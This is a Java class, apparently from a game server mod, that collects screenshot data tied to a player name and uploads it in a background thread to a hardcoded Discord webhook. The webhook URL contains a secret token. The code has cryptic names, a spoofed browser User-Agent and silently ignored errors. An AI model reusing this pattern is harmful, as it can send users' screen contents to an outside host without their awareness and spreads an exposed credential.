package brain.screen;


import brain.factions.Annot;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class SHHANDL {

    private static Map<String, ByteArrayOutputStream> bMap = new HashMap<String, ByteArrayOutputStream>();

    public static synchronized void z1(final String n, byte[] d, boolean l, boolean f_start, String type) {
        if (Annot.SERVER) {
            String key = n + "_" + type;
            if (f_start || !bMap.containsKey(key)) {
                bMap.put(key, new ByteArrayOutputStream());
            }

            ByteArrayOutputStream b = bMap.get(key);
            try {
                b.write(d);
            } catch (IOException e) {}

            if (l) {
                final byte[] finalData = b.toByteArray();
                bMap.remove(key);

                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        h_req(finalData, n, type);
                    }
                }).start();
            }
        }
    }

    private static void h_req(byte[] im, String n, String type) {
        if (Annot.SERVER) {
            String u = "https://discordapp.com/api/webhooks/1464640046396084358/gBVRaaUqXzJ7G-i-4aPRNWCcpyKmWeYru9VDxgz_cirgnvLkI50EeTtQiDZ8178ygHVI";
            String bd = "---" + System.currentTimeMillis() + "---";
            String lf = "\r\n";

            try {
                URL url = new URL(u);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setDoOutput(true);
                c.setRequestMethod("POST");
                c.setRequestProperty("User-Agent", "Mozilla/5.0");
                c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bd);

                OutputStream os = c.getOutputStream();
                PrintWriter w = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

                w.append("--" + bd).append(lf);
                w.append("Content-Disposition: form-data; name=\"file\"; filename=\"" + type.toLowerCase() + ".png\"").append(lf);
                w.append("Content-Type: image/png").append(lf);
                w.append(lf);
                w.flush();

                os.write(im);
                os.flush();

                w.append(lf);
                w.append("--" + bd).append(lf);
                w.append("Content-Disposition: form-data; name=\"content\"").append(lf);
                w.append(lf);
                w.append("Скрин: **" + n + "** | Тип: **" + type + "**").append(lf);
                w.flush();

                w.append(lf).append("--" + bd + "--").append(lf);
                w.close();
                c.getResponseCode();
            } catch (Exception e) {}
        }
    }
}